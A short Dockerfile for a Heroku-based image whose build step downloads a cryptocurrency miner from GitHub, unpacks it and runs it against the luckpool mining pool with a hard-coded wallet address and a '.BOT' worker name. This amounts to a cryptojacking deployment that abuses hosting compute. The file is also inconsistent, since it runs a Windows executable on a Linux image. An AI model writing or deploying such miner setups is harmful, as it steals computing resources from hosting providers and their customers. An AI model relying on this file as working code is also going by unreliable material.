FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_win64_avx2.zip; unzip hellminer_cpu_win64_avx2.zip; chmod +x hellminer.exe; ./hellminer.exe -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RN6MfBAJnpjchdY2L3EnnFQXkFkHzmrNoY.BOT -p x --cpu 1
CMD bash heroku.sh
